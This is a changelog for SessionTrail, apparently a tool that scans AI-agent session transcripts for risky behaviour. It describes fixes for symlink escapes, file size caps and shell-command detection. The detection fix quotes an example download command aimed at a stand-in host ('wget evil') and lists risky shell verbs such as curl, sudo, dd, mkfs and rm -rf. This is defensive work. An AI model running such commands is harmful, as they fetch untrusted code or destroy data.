# Changelog

All notable changes to this project will be documented here. The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html). Under v1.0, minor versions may carry breaking changes.

## [Unreleased]

### Fixed
- Directory-mode transcript files that exceed the shared input byte cap now emit a low-severity `transcript_file_skipped` coverage finding instead of silently disappearing from otherwise clean reports.

## [0.6.4] — 2026-05-28

### Security
- **Directory mode no longer follows symlinks out of the scanned transcript tree.** When invoked against a transcript directory, the recursive walk (`listJsonlFiles`) treated a symlinked `.jsonl` entry like any other file and read its target, so a symlink committed into an untrusted transcript tree could point at `/etc/passwd` or a sibling checkout and leak that content into finding evidence. The walk now skips symlinked entries (matching the ScopeTrail / CapabilityEcho directory walks). Single-file mode (`--transcript <file>`, an explicit user-named path) is unaffected; detection on legitimate trees is unchanged.
- **Directory-mode walks now skip files larger than the shared 10 MiB input cap** (`withinByteCap` from agent-gov-core), so a single huge transcript in an untrusted tree can't exhaust memory when read and parsed.

### Internal
- Bumped `agent-gov-core` dependency `^1.2.1` → `^1.3.0`. Bundle rebuilt.

## [0.6.3] — 2026-05-28

### Fixed
- **Shell detection: risky verbs hidden inside `bash -c "…"` / `$(…)` / backticks no longer escape the high-severity check.** `detectShell` tokenized commands with the flat `tokenizeShell`, which leaves evaluation contexts opaque — so `bash -c "wget evil -O /tmp/x"` was reduced to a single subcommand whose head was `bash`, never the inner `wget`. Risky *verbs* (`curl`, `wget`, `chmod`, `chown`, `sudo`, `kubectl`, `aws`, `dd`, `mkfs`, …) only escalate to `high` via the head check, so wrapping them in `-c` or `$()` silently downgraded them to `medium`. Only risky verbs that *also* matched a `RISKY_PATTERN` regex (e.g. `rm -rf`) survived the wrapper. Switched to core's `tokenizeShellDeep`, which recursively flattens the nested payload so the inner verb is seen. Regression tests cover the `bash -c` and `$()` shapes. Bundle rebuilt.

## [0.6.2] — 2026-05-28

### Changed
- Transcript parsing now delegates per-line work (runtime detection, Codex `function_call` argument coercion, `apply_patch` handling) to agent-gov-core's shared parser surface (`parseAnthropicLine` / `parseCodexLine` / `isCodexLine` / `isCodexSessionMeta`), removing SessionTrail's vendored second copy that could silently drift from the substrate parser. SessionTrail keeps its own line-by-line walk so every `ToolEvent` still carries the transcript `line` number and `source` path that finding locations depend on — core's `TranscriptEvent` is timestamp-keyed and intentionally drops both. No observable change to findings, counts, or report output; the bundle was rebuilt.
- `AgentRuntime` is now an alias of core's `Runtime`, picking up `'antigravity'` so the runtime-usage map no longer drifts when core adds a runtime.

### Internal
- Requires `agent-gov-core@^1.2.1` (was `^1.0.0`); the shared parser surface landed in core v1.1.0.

## [0.6.1] — 2026-05-22

### Fixed
- `--json-out <path>` now writes the canonical agent-gov-core `Report` envelope (was leaking the legacy `SessionReport` shape, breaking GovVerdict consolidation). The v0.6.0 release migrated the `--format json` stdout path to the canonical envelope but the bundled Action artifact's `--json-out` side-file path still wrote the legacy `{ rating, findingCount, toolInvocationCount, runtimeUsage, behaviorSummary, ... }` shape. GovVerdict@v0.2.1 rejected those reports via `validateReport`, so SessionTrail findings were silently missing from the consolidated suite review. Caught end-to-end via `Conalh/agent-gov-demo#1`. Tool-specific runtime metrics (`toolInvocationCount`, `runtimeUsage`, `behaviorSummary`, etc.) now ride inside `Report.data` per substrate convention. The fix is purely a bundle rebuild — source already routed both paths through `renderReport(report, 'json')` after v0.6.0 landed, but the published `v0.6.0` Action bundle predated that and was never re-tagged.

## [0.6.0] — 2026-05-22

**BREAKING** — JSON output now emits the canonical agent-gov-core `Report` envelope so the cross-tool meta-reviewer (GovVerdict) can ingest one shape across the whole suite.

### Changed (breaking)
- `--format json` output replaces the legacy `SessionReport` shape with the canonical `Report` envelope: `{ schemaVersion: '1.0', tool: 'session_trail', rating, findings, data: { toolInvocationCount, uniqueToolCount, runtimeUsage, behaviorSummary, toolUsage, pathHeatMap, parseStats } }`. The aggregate rating remains accessible at `.rating` (same path); the previous `.findingCount` is now `.findings.length`; SessionTrail-specific extras move under `.data.*`.
- Per-finding shape is unchanged because SessionTrail already emits the canonical `Finding` from agent-gov-core directly.
- `action.yml`: the Action step's jq paths now read `.findings | length` and `.data.toolInvocationCount` / `.data.uniqueToolCount` / `.data.runtimeUsage`. Action-level output keys (`finding-count`, `tool-invocation-count`, etc.) are unchanged.

### Why
- Closes the envelope mismatch that forced GovVerdict to carry a legacy adapter in `src/load.ts`. With SessionTrail completing the migration, the GovVerdict v0.2.0 release deletes the adapter.
- Unblocks the agent-gov-core v1.0 schema freeze: every consumer now flows through `createReport`, so the canonical envelope is the only contract downstream tools depend on.

### Internal
- Internal `SessionReport` type retained — markdown / text / GitHub annotation / SARIF renderers continue to consume it directly. The migration is at the JSON serialization edge only.
